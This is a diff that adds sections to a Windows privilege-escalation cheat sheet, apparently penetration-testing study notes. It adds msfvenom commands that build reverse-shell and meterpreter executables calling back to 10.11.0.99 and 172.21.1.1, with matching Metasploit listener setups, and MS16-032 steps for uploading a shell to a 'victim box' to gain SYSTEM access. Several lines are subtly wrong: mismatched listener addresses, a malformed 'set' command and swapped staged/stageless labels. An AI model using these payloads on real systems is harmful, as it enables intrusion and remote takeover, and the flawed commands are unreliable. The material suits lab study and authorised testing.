@@ -10,6 +10,7 @@
 * [Useful commands](#Useful-commands)
 * [Transfer files](#Transfer-files)
 * [Process](#Process)
+* [Payloads](#Payloads)
 * [Bypassing AV](#Bypassing-AV)
 * [Powershell](#Powershell)
 * [Automated Tools](#Automated-Tools)
@@ -410,6 +411,61 @@ accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 
 [Back](#summary)
 
+## Payloads
+* x64
+	* Stageless
+	```
+	msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.0.99 lport=443 -f exe -o shell.exe
+	```
+
+	Set up Listener in msfvenom
+	```
+	> use multi/handler
+	> set LHOST 10.11.0.99
+	> set LPORT 443
+	> set payload windows/x64/shell_reverse_tcp
+	> run
+	```
+	* Staged
+	```
+	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe
+	```
+	Set up Listener in msfvenom
+	```
+	> use multi/handler
+	> set LHOST 10.11.0.99
+	> set LPORT 443
+	> set windows/x64/meterpreter/reverse_tcp
+	> run
+	```
+* x86
+	* Stageless
+	```
+	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
+	```
+	Set up Listener in msfvenom
+	```
+	> use multi/handler
+	> set LHOST 10.11.0.99
+	> set LPORT 443
+	> set payload windows/meterpreter/reverse_tcp
+	> run
+	```
+	* Staged
+	```
+	msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
+	```
+	Set up Listener in msfvenom
+	```
+	> use multi/handler
+	> set LHOST 10.11.0.99
+	> set LPORT 443
+	> set payload windows/shell_reverse_tcp
+	> run
+	```
+[Back](#summary)
+
+
 ## Bypassing AV
 * Textbook
 ```
@@ -513,6 +569,24 @@ powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllV
 powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
 ```
 [Back](#summary)
+
+## Tricky Exploits
+* MS16-032
+	* Check if RDP is enabled
+		* If so, run 
+		```
+		searchsploit -m 39719
+		```
+		* Run powershell script and new command prompt should spawn
+	* If not, modify line 189 & 333
+	```
+	change "C:\Windows\System32\cmd.exe" to "C:\shell.exe"
+	```
+	* Create stageless x64 or x86 reverse shell
+	* Upload shell.exe and 39719.ps1 to the victim box
+	* Set up listener 
+	* Should get a reverse shell as system
+	* [More help](https://pentestlab.blog/tag/ms16-032/)
 
 ## Manual Enumeration Walk Through
 * [Fuzzy Security](http://www.fuzzysecurity.com/tutorials/16.html)
